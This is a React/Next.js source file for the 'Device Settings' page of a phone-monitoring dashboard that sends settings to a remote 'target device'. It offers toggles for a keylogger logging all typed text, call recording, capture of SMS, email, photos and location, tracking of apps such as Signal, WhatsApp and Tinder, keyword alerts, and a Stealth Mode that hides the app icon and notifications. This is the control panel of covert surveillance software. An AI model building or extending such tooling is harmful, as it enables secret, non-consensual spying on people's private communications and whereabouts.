"use client"

import { useState, useEffect, useCallback, useMemo, useRef } from "react"
import dynamic from "next/dynamic"
import { useRouter, usePathname } from "next/navigation"
import {
  Save, ChevronDown, ChevronUp, AlertCircle, Plus, X,
  Shield, Info, ToggleLeft, Globe, MapPin, Clock,
  KeyRound, Settings, Mic, Smartphone
} from "lucide-react"

import { PageHeader } from "@/components/shared/page-header"
import { Card, CardContent } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Switch } from "@/components/ui/switch"
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Checkbox } from "@/components/ui/checkbox"
import { Slider } from "@/components/ui/slider"
import { useToast } from "@/components/ui/use-toast"
import { Skeleton } from "@/components/ui/skeleton"

import { useDeviceStore } from "@/lib/stores/device-store"
import { createClient } from "@/lib/supabase/client"
import { DeviceSettings, InstalledApp } from "@/lib/types/database"
import { cn } from "@/lib/utils"

const GeofenceMapPicker = dynamic(
  () => import("@/components/dashboard/geofence-map-picker"),
  { ssr: false, loading: () => <div className="h-[280px] rounded-lg bg-slate-100 dark:bg-slate-800 animate-pulse" /> }
)

// ── Types ──────────────────────────────────────────────────────
type FormSettings = Omit<DeviceSettings, "id" | "device_id" | "created_at" | "updated_at">

type GeofenceZone = {
  id: string
  name: string
  lat: number
  lng: number
  radius: number
  trigger: "enter" | "exit" | "both"
}

const PLATFORMS = [
  { key: "track_whatsapp", label: "WhatsApp", emoji: "💬" },
  { key: "track_facebook", label: "Facebook", emoji: "📘" },
  { key: "track_instagram", label: "Instagram", emoji: "📷" },
  { key: "track_telegram", label: "Telegram", emoji: "✈️" },
  { key: "track_viber", label: "Viber", emoji: "📞" },
  { key: "track_signal", label: "Signal", emoji: "🔒" },
  { key: "track_snapchat", label: "Snapchat", emoji: "👻" },
  { key: "track_skype", label: "Skype", emoji: "💻" },
  { key: "track_line", label: "Line", emoji: "🟢" },
  { key: "track_kik", label: "Kik", emoji: "💬" },
  { key: "track_wechat", label: "WeChat", emoji: "🟢" },
  { key: "track_tinder", label: "Tinder", emoji: "🔥" },
  { key: "track_discord", label: "Discord", emoji: "🎮" },
  { key: "track_tiktok", label: "TikTok", emoji: "🎵" },
  { key: "track_youtube", label: "YouTube", emoji: "▶️" },
  { key: "track_zoom", label: "Zoom", emoji: "📹" },
  { key: "track_google_meet", label: "Google Meet", emoji: "📹" },
  { key: "track_reddit", label: "Reddit", emoji: "🤖" },
]

const TRACKING_FEATURES = [
  { key: "track_sms", label: "Track SMS", desc: "Monitor sent and received text messages" },
  { key: "track_calls", label: "Track Calls", desc: "Record call logs" },
  { key: "track_locations", label: "Track GPS Location", desc: "Track device location periodically" },
  { key: "track_photos", label: "Track Photos", desc: "Capture photos taken on device" },
  { key: "track_videos", label: "Track Videos", desc: "Monitor videos recorded and received" },
  { key: "track_contacts", label: "Track Contacts", desc: "Monitor address book changes" },
  { key: "track_apps", label: "Track Apps", desc: "Monitor installed apps and usage" },
  { key: "track_browser", label: "Track Browser History", desc: "Monitor website visits" },
  { key: "track_bookmarks", label: "Track Bookmarks", desc: "Monitor browser bookmarks" },
  { key: "track_keylogger", label: "Track Keylogger", desc: "Log all text typed on device" },
  { key: "track_calendar", label: "Track Calendar", desc: "Monitor calendar events" },
  { key: "track_emails", label: "Track Emails", desc: "Monitor email activity" },
  { key: "track_wifi", label: "Track WiFi", desc: "Monitor WiFi connections" },
  { key: "track_notifications", label: "Track Notifications", desc: "Capture all notifications" },
  { key: "track_sim_changes", label: "Track SIM Changes", desc: "Alert on SIM card changes" },
]

const DAYS = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
const LOC_INTERVALS = [5, 10, 15, 30, 60]

// ── Section Wrapper ────────────────────────────────────────────
function Section({
  emoji, title, children, defaultOpen = true
}: { emoji: string; title: string; children: React.ReactNode; defaultOpen?: boolean }) {
  const [open, setOpen] = useState(defaultOpen)
  return (
    <Collapsible open={open} onOpenChange={setOpen}>
      <Card className="border shadow-sm overflow-hidden">
        <CollapsibleTrigger className="w-full flex items-center justify-between px-5 py-4 bg-slate-50/80 dark:bg-slate-900/60 hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-b border-slate-200 dark:border-slate-800">
          <div className="flex items-center gap-3">
            <span className="text-xl">{emoji}</span>
            <span className="text-sm font-bold text-slate-700 dark:text-slate-200">{title}</span>
          </div>
          {open ? <ChevronUp className="h-4 w-4 text-slate-400" /> : <ChevronDown className="h-4 w-4 text-slate-400" />}
        </CollapsibleTrigger>
        <CollapsibleContent>
          <CardContent className="p-5">{children}</CardContent>
        </CollapsibleContent>
      </Card>
    </Collapsible>
  )
}

// ── Toggle Row ─────────────────────────────────────────────────
function ToggleRow({
  id, label, desc, checked, onChange, warning
}: { id: string; label: string; desc?: string; checked: boolean; onChange: (v: boolean) => void; warning?: string }) {
  return (
    <div className="flex items-start justify-between py-3 border-b border-slate-100 dark:border-slate-800/70 last:border-0 gap-4">
      <div className="flex flex-col gap-0.5 flex-1 min-w-0">
        <div className="flex items-center gap-2 flex-wrap">
          <Label htmlFor={id} className="text-sm font-medium text-slate-800 dark:text-slate-200 cursor-pointer">{label}</Label>
          {warning && <Badge variant="destructive" className="text-[9px] h-4 px-1.5 leading-[0]">⚠️ {warning}</Badge>}
        </div>
        {desc && <p className="text-xs text-slate-500 dark:text-slate-400">{desc}</p>}
      </div>
      <Switch id={id} checked={checked} onCheckedChange={onChange} className="shrink-0 mt-0.5" />
    </div>
  )
}

// ── Main Page ──────────────────────────────────────────────────
export default function DeviceSettingsPage() {
  const { toast } = useToast()
  const { selectedDeviceId } = useDeviceStore()
  const [deviceName, setDeviceName] = useState("")
  const [settings, setSettings] = useState<DeviceSettings | null>(null)
  const [form, setForm] = useState<Partial<FormSettings>>({})
  const [initialForm, setInitialForm] = useState<Partial<FormSettings>>({})
  const [isLoading, setIsLoading] = useState(false)
  const [isSaving, setIsSaving] = useState(false)
  const [installedApps, setInstalledApps] = useState<InstalledApp[]>([])

  // Geofence dialog
  const [geofenceDlg, setGeofenceDlg] = useState(false)
  const [gfName, setGfName] = useState("")
  const [gfLat, setGfLat] = useState(23.8103)
  const [gfLng, setGfLng] = useState(90.4125)
  const [gfRadius, setGfRadius] = useState(500)
  const [gfTrigger, setGfTrigger] = useState<"enter" | "exit" | "both">("both")
  const [gfEditId, setGfEditId] = useState<string | null>(null)

  // Block app dialog
  const [blockAppDlg, setBlockAppDlg] = useState(false)
  const [appSearch, setAppSearch] = useState("")

  // Keywords input
  const [keywordInput, setKeywordInput] = useState("")

  // Schedule restriction
  const [scheduleEnabled, setScheduleEnabled] = useState(false)

  const dirty = useMemo(() =>
    JSON.stringify(form) !== JSON.stringify(initialForm),
    [form, initialForm]
  )

  const f = <K extends keyof FormSettings>(key: K, val: FormSettings[K]) => {
    setForm(prev => ({ ...prev, [key]: val }))
  }

  const bg = <K extends keyof FormSettings>(key: K): boolean =>
    !!(form as any)[key]

  // ── Fetch ────────────────────────────────────────────────────
  const fetchSettings = useCallback(async () => {
    if (!selectedDeviceId) return
    setIsLoading(true)
    const supabase = createClient()

    const { data: dev } = await supabase.from("devices").select("device_name").eq("id", selectedDeviceId).single() as any
    setDeviceName(dev?.device_name || "Device")

    const { data: s } = await supabase.from("device_settings").select("*").eq("device_id", selectedDeviceId).single() as any
    if (s) {
      setSettings(s as DeviceSettings)
      const { id, device_id, created_at, updated_at, ...rest } = s as DeviceSettings
      setForm(rest)
      setInitialForm(rest)
      setScheduleEnabled(!!rest.schedule_restriction?.enabled)
    }

    const { data: apps } = await supabase.from("installed_apps").select("id,app_name,package_name").eq("device_id", selectedDeviceId).order("app_name") as any
    setInstalledApps(apps || [])
    setIsLoading(false)
  }, [selectedDeviceId])

  useEffect(() => {
    fetchSettings()
  }, [fetchSettings])

  // ── Save ─────────────────────────────────────────────────────
  const handleSave = async () => {
    if (!selectedDeviceId || !settings) return
    setIsSaving(true)
    const supabase = createClient()

    try {
      await (supabase as any).from("device_settings").update(form).eq("device_id", selectedDeviceId)

      // Send update_settings command to device
      await (supabase as any).from("remote_commands").insert({
        device_id: selectedDeviceId,
        command_type: "update_settings",
        parameters: form,
        status: "pending",
      })

      setInitialForm(form)
      toast({ title: "✅ Settings Saved", description: "Settings saved and sent to device." })
    } catch (err) {
      toast({ title: "Error", description: "Failed to save settings.", variant: "destructive" })
    } finally {
      setIsSaving(false)
    }
  }

  // ── Geofence helpers ─────────────────────────────────────────
  const geofenceZones: GeofenceZone[] = useMemo(() => {
    return Array.isArray((form as any).geofence_zones) ? (form as any).geofence_zones : []
  }, [form])

  const openAddGeofence = () => {
    setGfName(""); setGfLat(23.8103); setGfLng(90.4125); setGfRadius(500); setGfTrigger("both"); setGfEditId(null)
    setGeofenceDlg(true)
  }

  const openEditGeofence = (zone: GeofenceZone) => {
    setGfName(zone.name); setGfLat(zone.lat); setGfLng(zone.lng); setGfRadius(zone.radius); setGfTrigger(zone.trigger); setGfEditId(zone.id)
    setGeofenceDlg(true)
  }

  const saveGeofence = () => {
    if (!gfName.trim()) return
    const zone: GeofenceZone = {
      id: gfEditId || String(Date.now()),
      name: gfName.trim(), lat: gfLat, lng: gfLng, radius: gfRadius, trigger: gfTrigger
    }
    const existing = geofenceZones
    const updated = gfEditId ? existing.map(z => z.id === gfEditId ? zone : z) : [...existing, zone]
    f("geofence_zones", updated as any)
    setGeofenceDlg(false)
  }

  const removeGeofence = (id: string) => {
    f("geofence_zones", geofenceZones.filter(z => z.id !== id) as any)
  }

  // ── Blocked Apps helpers ─────────────────────────────────────
  const blockedApps: string[] = useMemo(() => (form as any).blocked_apps || [], [form])

  const filteredAppsForAdd = useMemo(() =>
    installedApps.filter(a =>
      !blockedApps.includes(a.package_name) &&
      (a.app_name?.toLowerCase().includes(appSearch.toLowerCase()) || a.package_name.toLowerCase().includes(appSearch.toLowerCase()))
    ), [installedApps, blockedApps, appSearch]
  )

  const addBlockedApp = (pkg: string) => {
    if (!blockedApps.includes(pkg)) f("blocked_apps", [...blockedApps, pkg] as any)
  }
  const removeBlockedApp = (pkg: string) => f("blocked_apps", blockedApps.filter(p => p !== pkg) as any)

  // ── Blocked Sites helpers ─────────────────────────────────────
  const blockedSites: string[] = useMemo(() => (form as any).blocked_websites || [], [form])
  const [siteInput, setSiteInput] = useState("")
  const addSite = () => {
    const s = siteInput.trim().replace(/^https?:\/\//, "").replace(/^www\./, "")
    if (s && !blockedSites.includes(s)) { f("blocked_websites", [...blockedSites, s] as any); setSiteInput("") }
  }

  // ── Keywords helpers ──────────────────────────────────────────
  const alertKeywords: string[] = useMemo(() => (form as any).alert_keywords || [], [form])
  const addKeyword = () => {
    const k = keywordInput.trim()
    if (k && !alertKeywords.includes(k)) { f("alert_keywords", [...alertKeywords, k] as any); setKeywordInput("") }
  }
  const removeKeyword = (kw: string) => f("alert_keywords", alertKeywords.filter(k => k !== kw) as any)

  // ── Schedule helpers ──────────────────────────────────────────
  const scheduleData = useMemo(() => (form as any).schedule_restriction || { enabled: false, start: "22:00", end: "06:00", days: DAYS }, [form])

  const updateSchedule = (patch: Record<string, any>) => {
    f("schedule_restriction", { ...scheduleData, ...patch } as any)
  }

  if (!selectedDeviceId) {
    return (
      <div className="p-8 pb-20 animate-in fade-in">
        <PageHeader title="⚙️ Device Settings" />
        <Card className="flex flex-col items-center justify-center p-12 text-center border-dashed border-2">
          <Smartphone className="h-10 w-10 text-slate-400 mb-4" />
          <h3 className="text-lg font-semibold mb-2">No Device Selected</h3>
          <p className="text-slate-500 max-w-sm">Select a device to configure its tracking settings.</p>
        </Card>
      </div>
    )
  }

  if (isLoading) {
    return (
      <div className="space-y-4 pb-20 animate-in fade-in">
        <PageHeader title="⚙️ Device Settings" />
        {Array.from({ length: 4 }).map((_, i) => (
          <Skeleton key={i} className="h-20 w-full rounded-xl" />
        ))}
      </div>
    )
  }

  if (!settings) {
    return (
      <div className="p-8 pb-20 animate-in fade-in">
        <PageHeader title="⚙️ Device Settings" />
        <Card className="flex flex-col items-center justify-center p-12 text-center border-rose-200 border-dashed">
          <AlertCircle className="h-10 w-10 text-rose-400 mb-4" />
          <h3 className="text-lg font-semibold mb-2">No Settings Found</h3>
          <p className="text-slate-500 max-w-sm">No settings record found for this device. Please ensure the device is registered properly.</p>
        </Card>
      </div>
    )
  }

  return (
    <>
      {/* Geofence Dialog */}
      <Dialog open={geofenceDlg} onOpenChange={setGeofenceDlg}>
        <DialogContent className="sm:max-w-lg">
          <DialogHeader>
            <DialogTitle>{gfEditId ? "Edit" : "Add"} Geofence Zone</DialogTitle>
            <DialogDescription>Click on the map to set the center point, then adjust the radius.</DialogDescription>
          </DialogHeader>

          <div className="space-y-4 py-2">
            <div>
              <Label htmlFor="gf-name">Zone Name</Label>
              <Input id="gf-name" placeholder="Home, School, Work..." value={gfName} onChange={e => setGfName(e.target.value)} className="mt-1" />
            </div>

            <GeofenceMapPicker
              center={[gfLat, gfLng]}
              radius={gfRadius}
              onCenterChange={(lat, lng) => { setGfLat(lat); setGfLng(lng) }}
              onRadiusChange={setGfRadius}
            />

            <div>
              <Label className="text-xs font-semibold text-slate-600 dark:text-slate-400 uppercase tracking-wider">Trigger Alert When</Label>
              <RadioGroup value={gfTrigger} onValueChange={(v) => setGfTrigger(v as any)} className="flex gap-4 mt-2">
                <div className="flex items-center gap-2"><RadioGroupItem value="enter" id="t-enter" /><Label htmlFor="t-enter" className="text-sm cursor-pointer">Enter</Label></div>
                <div className="flex items-center gap-2"><RadioGroupItem value="exit" id="t-exit" /><Label htmlFor="t-exit" className="text-sm cursor-pointer">Exit</Label></div>
                <div className="flex items-center gap-2"><RadioGroupItem value="both" id="t-both" /><Label htmlFor="t-both" className="text-sm cursor-pointer">Both</Label></div>
              </RadioGroup>
            </div>
          </div>

          <DialogFooter>
            <Button variant="outline" onClick={() => setGeofenceDlg(false)}>Cancel</Button>
            <Button disabled={!gfName.trim()} onClick={saveGeofence}>Save Zone</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Block App Dialog */}
      <Dialog open={blockAppDlg} onOpenChange={setBlockAppDlg}>
        <DialogContent className="sm:max-w-sm">
          <DialogHeader>
            <DialogTitle>Add Blocked App</DialogTitle>
          </DialogHeader>
          <Input
            placeholder="Search apps..."
            value={appSearch}
            onChange={e => setAppSearch(e.target.value)}
            className="mb-2"
          />
          <div className="max-h-56 overflow-y-auto divide-y divide-slate-100 dark:divide-slate-800 border rounded-lg">
            {filteredAppsForAdd.length === 0 ? (
              <p className="text-sm text-slate-400 text-center py-6">No apps found.</p>
            ) : filteredAppsForAdd.map(a => (
              <button key={a.id} onClick={() => { addBlockedApp(a.package_name); setBlockAppDlg(false) }}
                className="w-full text-left flex flex-col px-3 py-2 hover:bg-slate-50 dark:hover:bg-slate-900 transition-colors text-sm">
                <span className="font-medium text-slate-800 dark:text-slate-200">{a.app_name || a.package_name}</span>
                <span className="text-[10px] text-slate-500 font-mono truncate">{a.package_name}</span>
              </button>
            ))}
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setBlockAppDlg(false)}>Cancel</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* ── MAIN PAGE ── */}
      <div className="space-y-4 animate-in fade-in pb-[100px]">
        {/* Header */}
        <div className="flex flex-col sm:flex-row sm:items-start justify-between gap-3">
          <PageHeader
            title="⚙️ Device Settings"
            description={`Configure tracking features for ${deviceName}.`}
          />
          {dirty && (
            <Badge variant="outline" className="border-amber-300 bg-amber-50 dark:bg-amber-900/20 text-amber-700 dark:text-amber-400 self-start shrink-0 text-xs gap-1.5 px-3 py-1">
              <AlertCircle className="h-3.5 w-3.5" /> Unsaved changes
            </Badge>
          )}
        </div>

        <div className="space-y-4">
          {/* ── SECTION 1: Tracking Features ── */}
          <Section emoji="📊" title="Tracking Features">
            <div className="divide-y divide-slate-100 dark:divide-slate-800">
              {TRACKING_FEATURES.map(feat => (
                <ToggleRow
                  key={feat.key}
                  id={feat.key}
                  label={feat.label}
                  desc={feat.desc}
                  checked={bg(feat.key as keyof FormSettings)}
                  onChange={v => f(feat.key as keyof FormSettings, v as any)}
                />
              ))}
              <ToggleRow
                id="record_calls"
                label="Record Calls"
                desc="Record phone call audio"
                checked={bg("record_calls")}
                onChange={v => f("record_calls", v as any)}
                warning="Privacy"
              />
            </div>
          </Section>

          {/* ── SECTION 2: Social Media ── */}
          <Section emoji="💬" title="Social Media Tracking" defaultOpen={false}>
            <div className="flex gap-2 mb-4">
              <Button size="sm" variant="outline" onClick={() => PLATFORMS.forEach(p => f(p.key as keyof FormSettings, true as any))}>
                Enable All
              </Button>
              <Button size="sm" variant="outline" onClick={() => PLATFORMS.forEach(p => f(p.key as keyof FormSettings, false as any))}>
                Disable All
              </Button>
            </div>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-0 divide-y divide-slate-100 dark:divide-slate-800">
              {PLATFORMS.map(p => (
                <ToggleRow
                  key={p.key}
                  id={p.key}
                  label={`${p.emoji} ${p.label}`}
                  checked={bg(p.key as keyof FormSettings)}
                  onChange={v => f(p.key as keyof FormSettings, v as any)}
                />
              ))}
            </div>
          </Section>

          {/* ── SECTION 3: Location Settings ── */}
          <Section emoji="📍" title="Location Settings" defaultOpen={false}>
            <div className="flex flex-col sm:flex-row sm:items-center gap-3 max-w-sm">
              <Label className="text-sm font-medium shrink-0">Update Interval</Label>
              <Select
                value={String((form as any).location_interval_minutes || 10)}
                onValueChange={v => f("location_interval_minutes", Number(v) as any)}
              >
                <SelectTrigger className="w-full">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {LOC_INTERVALS.map(i => (
                    <SelectItem key={i} value={String(i)}>{i} minute{i > 1 ? "s" : ""}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
          </Section>

          {/* ── SECTION 4: Blocked Apps ── */}
          <Section emoji="🚫" title="Blocked Apps" defaultOpen={false}>
            <div className="flex flex-wrap gap-2 mb-4 min-h-[36px]">
              {blockedApps.length === 0 ? (
                <p className="text-sm text-slate-400 italic">No apps blocked.</p>
              ) : blockedApps.map(pkg => {
                const app = installedApps.find(a => a.package_name === pkg)
                return (
                  <div key={pkg} className="flex items-center gap-1.5 bg-rose-50 dark:bg-rose-900/30 border border-rose-200 dark:border-rose-900/50 text-rose-700 dark:text-rose-300 text-xs font-medium px-2.5 py-1 rounded-full">
                    {app?.app_name || pkg}
                    <button onClick={() => removeBlockedApp(pkg)} className="ml-0.5 hover:text-rose-900 focus:outline-none">
                      <X className="h-3 w-3" />
                    </button>
                  </div>
                )
              })}
            </div>
            <Button size="sm" variant="outline" onClick={() => { setAppSearch(""); setBlockAppDlg(true) }}>
              <Plus className="h-4 w-4 mr-1" /> Add App
            </Button>
          </Section>

          {/* ── SECTION 5: Blocked Websites ── */}
          <Section emoji="🌐" title="Blocked Websites" defaultOpen={false}>
            <div className="flex flex-wrap gap-2 mb-4 min-h-[36px]">
              {blockedSites.length === 0 ? (
                <p className="text-sm text-slate-400 italic">No websites blocked.</p>
              ) : blockedSites.map(site => (
                <div key={site} className="flex items-center gap-1.5 bg-rose-50 dark:bg-rose-900/30 border border-rose-200 dark:border-rose-900/50 text-rose-700 dark:text-rose-300 text-xs font-medium px-2.5 py-1 rounded-full">
                  {site}
                  <button onClick={() => f("blocked_websites", blockedSites.filter(s => s !== site) as any)} className="ml-0.5 hover:text-rose-900">
                    <X className="h-3 w-3" />
                  </button>
                </div>
              ))}
            </div>
            <div className="flex gap-2 max-w-sm">
              <Input
                placeholder="example.com"
                value={siteInput}
                onChange={e => setSiteInput(e.target.value)}
                onKeyDown={e => e.key === "Enter" && addSite()}
                className="h-9"
              />
              <Button size="sm" onClick={addSite}><Plus className="h-4 w-4 mr-1" /> Add</Button>
            </div>
          </Section>

          {/* ── SECTION 6: Geofence Zones ── */}
          <Section emoji="📍" title="Geofence Zones" defaultOpen={false}>
            <div className="space-y-2 mb-4">
              {geofenceZones.length === 0 ? (
                <p className="text-sm text-slate-400 italic">No geofence zones configured.</p>
              ) : geofenceZones.map(zone => (
                <div key={zone.id} className="flex items-center justify-between p-3 border border-slate-200 dark:border-slate-800 rounded-lg bg-slate-50 dark:bg-slate-900">
                  <div className="flex flex-col gap-0.5">
                    <span className="text-sm font-semibold text-slate-800 dark:text-slate-200">{zone.name}</span>
                    <div className="flex gap-2 text-xs text-slate-500">
                      <span>{zone.radius >= 1000 ? `${(zone.radius / 1000).toFixed(1)} km` : `${zone.radius} m`}</span>
                      <span>•</span>
                      <span className="capitalize">Trigger: {zone.trigger}</span>
                    </div>
                  </div>
                  <div className="flex items-center gap-1">
                    <Button size="sm" variant="ghost" onClick={() => openEditGeofence(zone)} className="h-7 px-2 text-xs">Edit</Button>
                    <Button size="sm" variant="ghost" onClick={() => removeGeofence(zone.id)} className="h-7 px-2 text-xs text-rose-600 hover:text-rose-700 hover:bg-rose-50 dark:hover:bg-rose-950">Remove</Button>
                  </div>
                </div>
              ))}
            </div>
            <Button size="sm" variant="outline" onClick={openAddGeofence}>
              <MapPin className="h-4 w-4 mr-1" /> Add Geofence Zone
            </Button>
          </Section>

          {/* ── SECTION 7: Schedule Restriction ── */}
          <Section emoji="⏰" title="Schedule Restriction" defaultOpen={false}>
            <div className="space-y-5">
              <ToggleRow
                id="schedule-enabled"
                label="Enable Schedule Restriction"
                desc="Block all apps during restricted hours (except Phone & Settings)"
                checked={scheduleEnabled}
                onChange={v => { setScheduleEnabled(v); updateSchedule({ enabled: v }) }}
              />

              {scheduleEnabled && (
                <div className="space-y-5 pt-2 border-t border-slate-100 dark:border-slate-800">
                  <div className="flex flex-col sm:flex-row gap-4">
                    <div className="flex flex-col gap-1.5 flex-1">
                      <Label className="text-xs text-slate-500 uppercase tracking-wider font-semibold">Start Time</Label>
                      <Input type="time" value={scheduleData.start || "22:00"} onChange={e => updateSchedule({ start: e.target.value })} className="max-w-[160px]" />
                    </div>
                    <div className="flex flex-col gap-1.5 flex-1">
                      <Label className="text-xs text-slate-500 uppercase tracking-wider font-semibold">End Time</Label>
                      <Input type="time" value={scheduleData.end || "06:00"} onChange={e => updateSchedule({ end: e.target.value })} className="max-w-[160px]" />
                    </div>
                  </div>

                  <div>
                    <Label className="text-xs text-slate-500 uppercase tracking-wider font-semibold mb-3 block">Active Days</Label>
                    <div className="flex flex-wrap gap-2">
                      {DAYS.map(day => {
                        const selected = (scheduleData.days || []).includes(day)
                        return (
                          <button
                            key={day}
                            onClick={() => {
                              const days: string[] = scheduleData.days || []
                              updateSchedule({ days: selected ? days.filter(d => d !== day) : [...days, day] })
                            }}
                            className={cn(
                              "px-3 py-1.5 text-xs font-semibold rounded-full border transition-all",
                              selected
                                ? "bg-indigo-600 text-white border-indigo-600"
                                : "border-slate-300 dark:border-slate-700 text-slate-600 dark:text-slate-400 hover:border-indigo-300"
                            )}
                          >
                            {day}
                          </button>
                        )
                      })}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </Section>

          {/* ── SECTION 8: Alert Keywords ── */}
          <Section emoji="🔑" title="Alert Keywords" defaultOpen={false}>
            <p className="text-xs text-slate-500 mb-3">Get alerted when these words appear in SMS, keylogger, or social messages. Press Enter to add.</p>
            <div className="flex flex-wrap gap-2 mb-4 min-h-[36px]">
              {alertKeywords.length === 0 ? (
                <p className="text-sm text-slate-400 italic">No keywords configured.</p>
              ) : alertKeywords.map(kw => (
                <div key={kw} className="flex items-center gap-1.5 bg-indigo-50 dark:bg-indigo-900/30 border border-indigo-200 dark:border-indigo-900/50 text-indigo-700 dark:text-indigo-300 text-xs font-semibold px-2.5 py-1 rounded-full">
                  {kw}
                  <button onClick={() => removeKeyword(kw)} className="hover:text-indigo-900 focus:outline-none ml-0.5">
                    <X className="h-3 w-3" />
                  </button>
                </div>
              ))}
            </div>
            <div className="flex gap-2 max-w-sm">
              <Input
                placeholder="Type keyword and press Enter..."
                value={keywordInput}
                onChange={e => setKeywordInput(e.target.value)}
                onKeyDown={e => e.key === "Enter" && addKeyword()}
                className="h-9"
              />
              <Button size="sm" onClick={addKeyword}><Plus className="h-4 w-4 mr-1" /> Add</Button>
            </div>
          </Section>

          {/* ── SECTION 9: General Settings ── */}
          <Section emoji="⚙️" title="General Settings" defaultOpen={false}>
            <div className="divide-y divide-slate-100 dark:divide-slate-800">
              <ToggleRow
                id="sync-wifi"
                label="Sync on Wi-Fi Only"
                desc="Only sync data when connected to Wi-Fi to save mobile data"
                checked={bg("sync_on_wifi_only")}
                onChange={v => f("sync_on_wifi_only", v as any)}
              />
              <ToggleRow
                id="stealth-mode"
                label="Stealth Mode"
                desc="Hide app icon and notifications on the target device"
                checked={bg("stealth_mode")}
                onChange={v => f("stealth_mode", v as any)}
                warning="Sensitive"
              />
            </div>
          </Section>
        </div>
      </div>

      {/* ── Sticky Save Bar ── */}
      <div className={cn(
        "fixed bottom-0 left-0 right-0 z-40 transition-transform duration-300",
        dirty ? "translate-y-0" : "translate-y-full"
      )}>
        <div className="max-w-screen-xl mx-auto px-6 pb-6">
          <div className="flex items-center justify-between gap-4 bg-white dark:bg-slate-950 shadow-2xl border border-slate-200 dark:border-slate-800 rounded-2xl px-5 py-4">
            <div className="flex items-center gap-2 text-sm text-slate-600 dark:text-slate-400">
              <AlertCircle className="h-4 w-4 text-amber-500" />
              <span>You have unsaved changes.</span>
            </div>
            <div className="flex items-center gap-2">
              <Button variant="ghost" size="sm" onClick={() => { setForm(initialForm); setScheduleEnabled(!!(initialForm as any).schedule_restriction?.enabled) }}>
                Discard
              </Button>
              <Button
                onClick={handleSave}
                disabled={isSaving}
                className="bg-indigo-600 hover:bg-indigo-700 text-white gap-2"
              >
                {isSaving ? (
                  <><span className="animate-spin h-4 w-4 border-2 border-white/40 border-t-white rounded-full" /> Saving...</>
                ) : (
                  <><Save className="h-4 w-4" /> Save Settings</>
                )}
              </Button>
            </div>
          </div>
        </div>
      </div>
    </>
  )
}
